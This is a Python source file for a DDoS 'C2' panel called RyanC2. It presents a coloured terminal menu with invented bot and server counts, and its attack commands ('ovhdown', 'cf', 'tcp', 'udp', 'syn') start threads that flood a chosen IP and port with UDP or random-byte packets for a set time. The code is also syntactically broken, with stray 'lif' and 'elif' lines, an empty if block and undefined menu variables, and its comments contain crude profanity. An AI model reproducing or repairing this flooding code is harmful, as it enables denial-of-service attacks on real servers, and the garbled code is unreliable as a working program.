import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json

prot = (random.randint(9,14))
sys.stdout.write("\x1b]2;[-] RyanC2 | Online User : [{}] | Running Attack [5] | Bot Connected [89] | Admin : [ItzSeven] | Backup Server : [2] | Username : admin\x07".format (prot))
os.system("clear")

nicknm = "Ryan"

helpservice = """
\033[0;93m            ╔══════════════════════════╦═══════════════════════╗
\033[0;93m            ║                    HELP COMMAND                  ║
\033[0;93m            ╚═╦═══════════════════════╦╩╦════════════════════╦═╝
\033[0;93m             ╔╩═══════════════════════╩═╩════════════════════╩╗
\033[0;93m             ║ \033[33m - ticket                                      \033[0;93m║
\033[0;93m             ║ \033[33m - plant                                       \033[0;93m║
\033[0;93m             ║ \033[33m - udpbypass [ip] [time] [port]                \033[0;93m║
\033[0;93m             ║ \033[33m - Layer7 [COMING SOON]                        \033[0;93m║    
\033[0;93m             ║ \033[33m - Layer4 [COMING SOON]                        \033[0;93m║                     
\033[0;93m             ║ \033[33m - methods                                     \033[0;93m║
\033[0;93m             ╚╦══════════════════════════════════════════════╦╝
\033[0;93m              ║\033[93m       \033[93mEXAMPLE \033[33m[methods] 8.8.8.8 60 80        \033[0;93m║
\033[0;93m              ╚══════════════════════════════════════════════╝\033[0;93m
"""
layer4 = """\033[36m
\033[36m
\033[36m
\033[36m
\033[36m

\033[36m            ╔══════════════════════════╦════════════════════════════╗
\033[35m            ║  \033[32m                                                           \033[35m║   \033[32m                                                                             ║
\033[35m            ║  \033[32m                                                           \033[35m║   \033[32m                                                                             ║
\033[36m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[35m             ║ \033[32m                                                         \033[35m║ ║ \033[32m                                                                             ║
\033[35m             ║ \033[32m                                                         \033[32m║ ║ \033[32m                                                                             ║
\033[35m             ║\033[36m- - - - - - - \033[93m                                               ║
\033[35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[35m            ║    \033[32mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[35m║
\033[35m            ╚═══════════════════════════════════════════════════════╝
"""
banner =  """
\033[0;36m		                     Ryan\033[0;34mC2
\033[0;36m                               TeamDevaloper\033[0;34mRyan		        
\033[0;36m                               TeamForever\033[0;34mTools
\033[0;36m                             Hosted By :\033[0;34m RyanFR

\033[35m                ╔═══════════════════════════════════════════════╗
\033[35m                ║\033[32m- - - - - - - Ryan And  \033[36m@FR \033[35m- - - - - - -║
\033[35m                ║\033[32m  - - - Type \033[36mhelp\033[35m to see the Help Menu - - - - ║
\033[35m                ╚═══════════════════════════════════════════════


\033[35m                    ╔════════════════════════════════════════╗
\033[35m                    ║\033[32m- -Connection Has Been \033[36m(ESTABILISHED)- -\033[35m║
\033[35m                    ╚════════════════════════════════════════╝
"""

cookie = open(".sinfull_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
atks = 0

def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1


def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
#minimalPunyaBapa
	while True:
		bots = (random.randint(520,900))
		sys.stdout.write("\x1b]2;Ryan. | Devices: [{}] | Spoofed Servers [19] | Server Units [8] | Clients: [18]\x07".format (bots))
		sin = input("\033[32m[\033[35m{}\033[32m@Joker]\033[36m$ \033[96m".format(nicknm)).lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (banner)
			main()
		if sinput == "cls":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "vip":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "layer4":
			os.system ("clear")
			print (layer4)
			main()
		elif sinput == "method":
			os.system ("clear")
			print (methods)
			main()
		elif sinput == "methods":
			os.system ("clear")
			print (methods)
			main()
		elif sinput == "private":
			os.system ("clear")
			print (private)
			main()
		elif sinput == "gen3":
			os.system ("clear")
			print (gen3)
			main()
		elif sinput == "vip-methods":
			os.system ("clear")
			print (raw)
			main()
		elif sinput == "help":
			main()
		elif sinput == "exit":
			os.system ("clear")
			exit()
		elif sinput == "ovhdown":
			try:
				if running >= 9000000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-kill2":
			try:
				if running >= 9000000:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
			#minimal punya kontol buat rename KONTOL
		elif sinput == "cf":
			try:
				if running >= 90000000:
					if running >= 1:
						print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
						main ()
				else:
					sinput, host, timer, port = sin.split (" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
				lif sinput == "syn":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						pack = 12847
						punch = random._urandom(int(pack))
						payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
				main()
			except socket.gaierror:
				main()
				elif sinput == "tcp":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 12847
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
			elif sinput == "udp":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 666
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
				#KONTOL MEMEK YANG RENAME GWEHJ UDAH BELAIN PULANG KERJA KONTOL BUAT NGODING MEMEK
				